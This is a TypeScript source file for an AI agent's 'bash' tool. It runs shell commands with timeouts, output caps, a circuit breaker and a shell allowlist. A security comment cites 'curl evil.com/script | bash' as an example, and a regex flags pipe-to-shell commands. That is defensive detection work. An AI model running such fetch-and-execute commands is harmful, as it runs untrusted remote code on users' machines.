import { spawn } from 'node:child_process';
import * as os from 'node:os';
import type { Tool, ToolStreamEvent } from '@wrongstack/core';
import { buildChildEnv } from './_env.js';
import { normalizeCommandOutput } from './_util.js';
import { redactCommand } from './process-registry.js';
import { getProcessRegistry } from './process-registry.js';

interface BashInput {
  command: string;
  timeout_ms?: number | undefined;
  background?: boolean | undefined;
}

interface BashOutput {
  output: string;
  exit_code: number | null;
  timed_out: boolean;
  pid?: number | null | undefined;
  error?: string | undefined;
}

const MAX_OUTPUT = 32_768;
// 32 KB — keeps context manageable for arbitrary commands. bash output
// is typically unbounded LLM tool-use context; larger caps risk pushing
// the context window to compaction on every invocation.

// 5 minutes — generous enough for most real-world commands (npm install,
// docker build, etc.) without letting a hung process consume the session.
// The per-call timeout_ms parameter still allows precise overrides.
// The circuit breaker's slow-call threshold (180s) sits below this so
// commands that run >3min still count as "slow" and can trip the breaker
// after 3 occurrences.
const DEFAULT_TIMEOUT_MS = 300_000;

// Flush partial_output every 200ms or when 4 KiB accumulates — whichever
// comes first. Smaller batches make the TUI feel responsive; larger ones
// keep EventBus traffic reasonable on chatty processes.
const STREAM_FLUSH_INTERVAL_MS = 200;
const STREAM_FLUSH_BYTES = 4 * 1024;

export const bashTool: Tool<BashInput, BashOutput> = {
  name: 'bash',
  category: 'Shell',
  description:
    'Execute an arbitrary command in the user\'s default shell (bash/zsh/pwsh/cmd). ' +
    'stdout and stderr are merged into one stream. This is the most powerful and dangerous tool — ' +
    'it gives the model full access to the developer\'s machine. Prefer specialized tools whenever possible.',
  usageHint:
    'SECURITY WARNING: This tool runs with the full privileges of the current user.\n\n' +
    'Best practices for the model:\n' +
    '- Strongly prefer `exec` for known safe commands (node, npm, pnpm, tsc, git, etc.).\n' +
    '- Use bash only when you genuinely need shell features (pipes, redirection, complex one-liners).\n' +
    '- Prefer single focused commands over huge `&&` chains.\n' +
    '- Use `background: true` only for long-running processes (dev servers, watchers).\n' +
    '- The working directory is the project root.\n' +
    '- Output may be truncated in the middle for very large results.',
  permission: 'confirm',
  mutating: true,
  riskTier: 'destructive',
  // Trust rules match on the literal `command` string. Without subjectKey
  // the policy heuristic would have done the same here, but declaring it
  // explicitly removes the implicit cross-tool aliasing.
  subjectKey: 'command',
  capabilities: ['shell.arbitrary'],
  timeoutMs: 300_000,
  maxOutputBytes: MAX_OUTPUT,
  estimatedDurationMs: 30_000,
  inputSchema: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description: 'The exact shell command to run. Prefer simple, focused commands.',
      },
      timeout_ms: {
        type: 'integer',
        description: 'Optional timeout for this specific command in milliseconds.',
      },
      background: {
        type: 'boolean',
        description: 'If true, launch the process in the background and return the PID immediately.',
      },
    },
    required: ['command'],
  },
  async execute(input, ctx, opts) {
    let final: BashOutput | undefined;
    const executeStream = bashTool.executeStream;
    if (!executeStream) throw new Error('bashTool: stream execution unavailable');
    for await (const ev of executeStream(input, ctx, opts)) {
      if (ev.type === 'final') final = ev.output;
    }
    if (!final) throw new Error('bash: stream ended without final event');
    return final;
  },
  async *executeStream(input, ctx, opts): AsyncGenerator<ToolStreamEvent<BashOutput>> {
    if (!input?.command) throw new Error('bash: command is required');

    const registry = getProcessRegistry();
    // Background processes bypass the circuit breaker — they are fire-and-forget
    // and should not affect breaker state. This allows background vitest, dev
    // servers, etc. to run even when the breaker is open.
    const bypassBreaker = !!input.background;
    if (!registry.beforeCall(bypassBreaker)) {
      yield {
        type: 'final',
        output: {
          output: '',
          exit_code: 1,
          timed_out: false,
          pid: null,
          error:
            'bash: circuit breaker open — too many consecutive failures or slow calls. Use /kill to inspect or /kill reset to recover.',
        },
      };
      return;
    }

    // Security: detect and warn about pipe-to-shell patterns that could lead to
    // arbitrary code execution (e.g., "curl evil.com/script | bash"). This pattern
    // is particularly dangerous because the user confirms a seemingly innocuous command
    // but the downloaded script executes arbitrary code.
    const PIPE_TO_SHELL_PATTERN = /\|\s*(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)/i;
    if (PIPE_TO_SHELL_PATTERN.test(input.command)) {
      console.warn(JSON.stringify({
        level: 'warn',
        event: 'bash.pipe_to_shell_detected',
        message: 'Detected pipe-to-shell pattern. Consider reviewing the full command before confirming.',
        command_prefix: input.command.slice(0, 100), // Log first 100 chars for review
        timestamp: new Date().toISOString(),
      }));
    }

    const timeoutMs = Math.max(1, Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT_MS, 600_000));

    const isWin = os.platform() === 'win32';
    // Use WRONGSTACK_SHELL / WRONGSTACK_COMSPEC for explicit override.
    // If not set, fall back to an allowlist: /bin/bash, /bin/zsh, /bin/sh
    // on POSIX; cmd.exe, powershell.exe on Windows. The standard SHELL and
    // COMSPEC env vars are NOT trusted — they are user-controllable and could
    // point to an arbitrary binary on shared systems.
    const shell = (() => {
      const explicit = process.env[isWin ? 'WRONGSTACK_COMSPEC' : 'WRONGSTACK_SHELL'];
      if (explicit) return explicit;
      if (isWin) return process.env['COMSPEC'] ?? 'cmd.exe';
      // POSIX: use SHELL only if it appears in a short allowlist.
      const fromEnv = process.env['SHELL'];
      if (fromEnv) {
        const name = fromEnv.split('/').pop() ?? '';
        if (['bash', 'zsh', 'sh', 'dash', 'fish'].includes(name)) return fromEnv;
      }
      return '/bin/bash';
    })();
    const args = isWin ? ['/c', input.command] : ['-c', input.command];

    const env = buildChildEnv(ctx.session?.id);

    // On POSIX we put the shell in its own process group so that timeout /
    // abort can kill the entire group with `process.kill(-pid)`. Otherwise
    // `bash -c "sleep 9999 & disown"` would leave the grandchild running.
    // `detached: true` is also reused for the user-facing background mode;
    // we always want detached on POSIX, only on Windows is it tied to the
    // explicit background flag.
    const detached = isWin ? !!input.background : true;

    const startedAt = Date.now();

    if (input.background) {
      // Background mode: capture stdout/stderr with bounded buffers so a
      // malicious command can't write unbounded output. Apply MAX_OUTPUT cap.
      let buf = '';
      let truncated = false;
      const child = spawn(shell, args, {
        cwd: ctx.projectRoot,
        env,
        stdio: ['ignore', 'pipe', 'pipe'],
        detached: true,
        signal: opts.signal,
      });
      const pid = child.pid;
      if (typeof pid === 'number') {
        registry.register({
          pid,
          name: 'bash',
          command: redactCommand(input.command),
          startedAt: Date.now(),
          sessionId: ctx.session?.id,
          child,
        });
        // Register the close handler on the same tick as spawn() so the
        // handler is guaranteed to be in place before Node's event loop
        // can deliver the close event.
        child.on('close', () => registry.unregister(pid));
      }
      child.stdout?.on('data', (chunk: Buffer) => {
        if (!truncated) {
          const remain = MAX_OUTPUT - buf.length;
          if (remain > 0) {
            buf += chunk.toString().slice(0, remain);
          }
          if (buf.length >= MAX_OUTPUT) truncated = true;
        }
      });
      child.stderr?.on('data', (chunk: Buffer) => {
        if (!truncated) {
          const remain = MAX_OUTPUT - buf.length;
          if (remain > 0) {
            buf += chunk.toString().slice(0, remain);
          }
          if (buf.length >= MAX_OUTPUT) truncated = true;
        }
      });
      child.on('close', () => {
        registry.afterCall(Date.now() - startedAt, false, bypassBreaker);
      });
      if (typeof pid === 'number') child.unref(); // unref() so the event loop can exit while this background process runs.
      yield {
        type: 'final',
        output: {
          output: normalizeCommandOutput(buf),
          exit_code: null,
          timed_out: false,
          pid,
        },
      };
      return;
    }

    // Foreground mode: pipe stdout/stderr for streaming output.
    const child = spawn(shell, args, {
      cwd: ctx.projectRoot,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
      detached,
      signal: opts.signal,
    });

    // Register with global registry so Ctrl+C / /kill can find and kill it.
    const pid = child.pid;
    if (typeof pid === 'number') {
      registry.register({
        pid,
        name: 'bash',
        command: redactCommand(input.command),
        startedAt: Date.now(),
        sessionId: ctx.session?.id,
        child,
      });
    }

    let buf = '';
    let pending = '';
    let timedOut = false;
    const timers: NodeJS.Timeout[] = [];

    function killWithTimeout(
      child: ReturnType<typeof spawn>,
      timeoutMs: number,
    ): void {
      if (isWin) {
        try { child.kill(); } catch { /* ignore */ }
        return;
      }

      // Best-effort SIGTERM: try process-group kill first, fall back to child.kill.
      try {
        if (typeof child.pid === 'number') {
          try { process.kill(-child.pid, 'SIGTERM'); }
          catch { child.kill('SIGTERM'); }
        } else {
          child.kill('SIGTERM');
        }
      } catch { /* ignore */ }

      // After timeoutMs, assert-kill with SIGKILL.
      const killTimer = setTimeout(() => {
        try {
          if (typeof child.pid === 'number') {
            try { process.kill(-child.pid, 'SIGKILL'); }
            catch { child.kill('SIGKILL'); }
          } else {
            child.kill('SIGKILL');
          }
        } catch { /* ignore */ }
      }, timeoutMs);
      timers.push(killTimer);
      killTimer.unref?.();
    }

    const timer = setTimeout(() => {
      timedOut = true;
      killWithTimeout(child, 2000);
    }, timeoutMs);
    timers.push(timer);
    timer.unref?.();

    // Bridge the EventEmitter-style child to an async iterator.
    type Chunk =
      | { kind: 'data'; text: string }
      | { kind: 'end'; code: number | null }
      | { kind: 'error'; err: Error };
    const queue: Chunk[] = [];
    let resolveNext: ((c: Chunk) => void) | null = null;
    const push = (c: Chunk) => {
      if (resolveNext) {
        const r = resolveNext;
        resolveNext = null;
        r(c);
      } else {
        queue.push(c);
      }
    };
    const next = (): Promise<Chunk> =>
      new Promise((resolve) => {
        const c = queue.shift();
        if (c) resolve(c);
        else resolveNext = resolve;
      });

    let lastFlush = Date.now();
    const flush = () => {
      if (pending.length === 0) return null;
      const text = pending;
      pending = '';
      lastFlush = Date.now();
      return text;
    };

    child.stdout?.on('data', (chunk) => {
      const text = chunk.toString();
      buf += text;
      pending += text;
      push({ kind: 'data', text });
    });
    child.stderr?.on('data', (chunk) => {
      const text = chunk.toString();
      buf += text;
      pending += text;
      push({ kind: 'data', text });
    });

    child.on('error', (err) => {
      for (const t of timers) clearTimeout(t);
      registry.afterCall(Date.now() - startedAt, true);
      push({ kind: 'error', err });
    });
    child.on('close', (code) => {
      for (const t of timers) clearTimeout(t);
      if (typeof pid === 'number') registry.unregister(pid);
      registry.afterCall(Date.now() - startedAt, code !== 0 && code !== null);
      push({ kind: 'end', code });
    });

    try {
      while (true) {
        const c = await next();
        if (c.kind === 'error') throw c.err;
        if (c.kind === 'end') {
          const remainder = flush();
          if (remainder !== null) {
            yield { type: 'partial_output', text: remainder };
          }
          yield {
            type: 'final',
            output: {
              output: normalizeCommandOutput(buf),
              exit_code: c.code,
              timed_out: timedOut,
            },
          };
          return;
        }
        const now = Date.now();
        if (pending.length >= STREAM_FLUSH_BYTES || now - lastFlush >= STREAM_FLUSH_INTERVAL_MS) {
          const text = flush();
          if (text) yield { type: 'partial_output', text };
        }
      }
    } finally {
      for (const t of timers) clearTimeout(t);
    }
  },
};

// Re-export types so consumers can narrow on stream events.
export type { BashInput, BashOutput };